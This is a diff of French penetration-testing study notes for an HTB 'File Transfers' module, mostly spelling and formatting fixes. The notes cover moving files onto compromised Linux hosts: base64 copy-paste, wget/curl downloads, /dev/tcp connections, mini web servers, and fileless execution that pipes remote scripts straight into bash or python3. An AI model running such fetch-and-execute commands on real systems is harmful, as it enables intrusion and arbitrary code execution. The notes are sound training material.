@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-04-20T16:41:28.532Z
+date: 2025-04-20T16:42:44.264Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -337,26 +337,28 @@ ftp -v -n -s:ftpcommand.txt
 
 ## Linux File Transfer Methods
 
-La pluspart des malwares utilisent HTTP/HTTPS pour communiquer.
+La plupart des malwares utilisent HTTP/HTTPS pour communiquer.
 
 ### Base64 Encoding / Decoding
 
 Selon la taille du fichier, on peut le transférer sans réseau. Avec un accès terminal, il suffit de l'encoder en base64, copier/coller son contenu, puis le décoder.
 
 Pour calculer le hash MD5 du fichier:
+
 ```
 md5sum <fichier>
 ```
 
 Pour encoder le fichier en base64:
+
 ```
 cat <fichier> |base64 -w 0;echo
 ```
 
 `-w 0` permet d'avoir la sortie sur une ligne unique et `echo` permet de créer une nouvelle ligne pour copier plus facilement le chaîne.
 
+Une fois sur la machine de destination, pour décoder la chaine vers un fichier:
 
-Une fois sur la machine de destination, pour décoder la châine vers un fichier:
 ```
 echo -n <chaine> | base64 -d > <fichier>
 ```
@@ -370,10 +372,13 @@ md5sum <fichier>
 ### Web Downloads with Wget and cURL
 
 Télécharger un fichier avec wget:
+
 ```
 wget <URI> -O <fichier de sortie>
 ```
+
 Télécharger un fichier avec curl:
+
 ```
 curl <URI> -o <fichier de sortie>
 ```
@@ -385,11 +390,13 @@ Il est possible d'utiliser la fonction de [piping](https://www.geeksforgeeks.org
 Certains payloads, comme mkfifo, écrivent des fichiers sur le disque. Même si l'exécution peut être "fileless" (sans fichier) en utilisant un pipe, certains payloads peuvent créer des fichiers temporaires sur le système d'exploitation.
 
 Exemple d'opération sans fichier avec Curl:
+
 ```
 curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 ```
 
 Exemple d'opération sans fichier avec Wget:
+
 ```
 wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
 ```
@@ -399,19 +406,22 @@ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/
 Il peut arriver qu'aucun outil de transfert de fichiers classique ne soit disponible.
 Si Bash version 2.04 ou supérieure (avec l'option --enable-net-redirections) est installé, il est possible d'utiliser le fichier [/dev/tcp](https://acc3ssp0int.com/2023/10/15/back-2-basics-dev-tcp/) pour télécharger des fichiers simplement.
 
-[Guide pour effectuer des requètes HTTP avec /dev/tcp](https://rednafi.com/misc/http_requests_via_dev_tcp/)
+[Guide pour effectuer des requêtes HTTP avec /dev/tcp](https://rednafi.com/misc/http_requests_via_dev_tcp/)
 
 Établir une connexion TCP:
+
 ```
 exec 3<>/dev/tcp/<adresse>/<port>
 ```
 
-Exemple d'envoi d'une requète HTTP GET:
+Exemple d'envoi d'une requête HTTP GET:
+
 ```
 echo -e "GET <chemin> HTTP/1.1\n\n">&3
 ```
 
 Récupérer la réponse:
+
 ```
 cat <&3
 ```
@@ -438,6 +448,7 @@ python3 -m pip install --user uploadserver
 ```
 
 Se rendre dans le répertoire dédié à l'envoi.
+
 ```
 mkdir https && cd https
 ```
@@ -467,23 +478,25 @@ Comme les distributions Linux ont souvent Python ou PHP installés, démarrer un
 Il est possible de lancer un serveur web avec plusieurs langages. Si la machine compromise n'a pas de serveur web installé, on peut utiliser un mini serveur web. Bien qu'ils soient moins sécurisés, ils offrent une grande flexibilité, notamment pour changer rapidement le dossier racine (webroot) et le port d'écoute. Cependant il est possible que le traffic entrant ne soit pas autorisé.
 
 Créer un serveur web avec Python3:
+
 ```
 python3 -m http.server
 ```
 
 Créer un serveur web avec Python 2.7:
+
 ```
 python2.7 -m SimpleHTTPServer
 ```
 
 Créer un serveur web avec Php:
+
 ```
 php -S 0.0.0.0:8000
 ```
 
 Créer un serveur web avec Ruby:
+
 ```
 ruby -run -ehttpd . -p8000
 ```
-
-
